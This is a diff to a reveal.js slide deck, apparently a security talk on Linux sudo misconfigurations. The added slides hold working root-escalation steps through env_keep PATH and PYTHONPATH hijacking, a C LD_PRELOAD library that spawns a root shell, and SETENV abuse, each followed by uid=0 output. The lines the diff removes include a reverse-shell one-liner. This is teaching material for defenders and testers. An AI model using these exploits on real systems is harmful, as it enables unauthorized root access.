@@ -475,7 +475,7 @@
 
 					<section class="text-left">
 						<p class="fragment">Dangerous Commands</p>
-						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-6|6">
 							$ sudo -l
 							Matching Defaults entries for sudo0 on parrot:
 								mail_badpass, editor=/usr/bin/nvim, use_pty
@@ -486,43 +486,153 @@
 					</section>
 
 					<section class="text-left">
-						<p class="fragment">env_keep + PATH</p>
-						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-14|7|9-10|12-14|">
+						<p class="fragment">env_keep + PATH (1/2)</p>
+						<p class="fragment">It loads executed commands location</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-10|4|7|1-10">
+							$ sudo -l
+							Matching Defaults entries for sudo1 on parrot:
+								env_reset, mail_badpass, editor=/usr/bin/nvim, use_pty,
+								env_keep=PATH
+
+							User sudo1 may run the following commands on parrot:
+								(ALL) NOPASSWD: /home/sudo1/script.sh
+
+							$ cat /home/sudo1/script.sh 
+							ls -la
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						<p class="fragment">env_keep + PATH (2/2)</p>
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">
+							$ echo 'bash' > ls
+							$ chmod +x ls
+							$ export PATH=$HOME/:$PATH
+							$ sudo /home/sudo1/script.sh
+							# id
+							uid=0(root) gid=0(root) groups=0(root)								
+
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						env_keep + PYTHONPATH (1/2)
+						Default location to import python modules
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-11|4|7|1-11">
+							$ sudo -l
+							Matching Defaults entries for sudo2 on parrot:
+								env_reset, mail_badpass, editor=/usr/bin/nvim, use_pty,
+								env_keep=PYTHONPATH
+
+							User sudo2 may run the following commands on parrot:
+								(ALL) NOPASSWD: /usr/bin/python /home/sudo2/script.py
+
+							$ cat script.py 
+							import random;
+							print(random.randint(1, 10))
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						env_keep + PYTHONPATH (2/2)
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="">								
+							$ echo 'import os' > random.py
+							$ echo 'os.system("bash")' >> random.py
+							$ export PYTHONPATH=$HOME
+							$ sudo python /home/sudo2/script.py
+							┌─[root@parrot]─[/home/sudo2]
+							└──╼ #id
+							uid=0(root) gid=0(root) groups=0(root)
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						env_keep + LD_PRELOAD (1/4)
+						<pre data-id="code-animation"><code class="hljs bash fragment" data-trim data-line-numbers="1-7|4|1-7">
+							$ sudo -l
+							Matching Defaults entries for sudo3 on parrot:
+								env_reset, mail_badpass, editor=/usr/bin/nvim, use_pty,
+								env_keep=LD_PRELOAD
+
+							User sudo3 may run the following commands on parrot:
+								(ALL) NOPASSWD: /usr/bin/id
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+
+						<p>env_keep + LD_PRELOAD (2/4)</p>
+						<p>
+							<ul>
+								<li class="fragment">Loads shared libraries from this variable</li>
+								<li class="fragment">What is a shared library (.so files) ?</li>
+								<li class="fragment">Used for debugging native apps!</li>
+							</ul>
+						</p>
+					</section>
+
+					<section class="text-left">
+						env_keep + LD_PRELOAD (3/4)
+						<p>sample .so file</p>
+						<pre data-id="code-animation"><code class="hljs cpp fragment" data-trim data-line-numbers="">
+							$ cat exploit.c
+
+							#include &lt;stdio.h&gt;
+							#include &lt;stdlib.h&gt;
+							#include &lt;unistd.h&gt;
 							
+							void _init() {
+								unsetenv("LD_PRELOAD");
+								setuid(0);
+								setgid(0);
+								system("/bin/bash -p");
+							}
+						</code></pre>
+					</section>
+					<section class="text-left">
+						env_keep + LD_PRELOAD (4/4)
+						<pre data-id="code-animation"><code class="hljs cpp fragment" data-trim data-line-numbers="">
+							$ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
+							$ sudo LD_PRELOAD=./exploit.so id
+
+							┌─[root@parrot]─[/home/sudo3]
+							└──╼ #id
+							uid=0(root) gid=0(root) groups=0(root)
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						SETENV (1/2)
+						<pre data-id="code-animation"><code class="hljs cpp fragment" data-trim data-line-numbers="1-6|6">
+							$ sudo -l
+							Matching Defaults entries for sudo4 on parrot:
+								env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, editor=/usr/bin/nvim, use_pty
+							
+							User sudo4 may run the following commands on parrot:
+								(ALL) SETENV: NOPASSWD: /home/sudo4/script.sh
+						</code></pre>
+					</section>
+
+					<section class="text-left">
+						SETENV (2/2)
+						<pre data-id="code-animation"><code class="hljs cpp fragment" data-trim data-line-numbers="1-12|6|7-8|10-12|1-12">
+							$ cat script.sh 
+							ls -la
+
+							$ echo 'bash' > ls
+							$ chmod +x ./ls
+							$ sudo PATH=$HOME/:$PATH /home/sudo4/script.sh 
+							# id
+							uid=0(root) gid=0(root) groups=0(root)
+
+							$ sudo LD_PRELOAD=./exploit.so /home/sudo4/script.sh 
+							# id
+							uid=0(root) gid=0(root) groups=0(root)
 						</code></pre>
 					</section>
 
 				</section>
 
-				<!-- <section data-markdown>
-					<textarea data-template>
-						## Bio
-						Kourosh Rajabzadeh
-
-						Bachelor of Computer Engineering at AUT
-
-						Penetration Tester | CTF Player
-						---
-						## Slide 2
-						---
-						## Slide 3
-						```cpp [1-2|3|4]
-						#include &lt;stdio.h&gt;
-						#include &lt;stdlib.h&gt;
-						#include &lt;unistd.h&gt;
-						
-						void _init() {
-							unsetenv("LD_PRELOAD");
-							setuid(0);
-							setgid(0);
-							system("/bin/bash -p");
-							// system("bash -c 'bash -i >& /dev/tcp/127.0.0.1/10001 0>&1'");
-						}
-						---
-						### slide 3.1
-						```
-					</textarea>
-				</section> -->
 			</div>
 		</div>
 
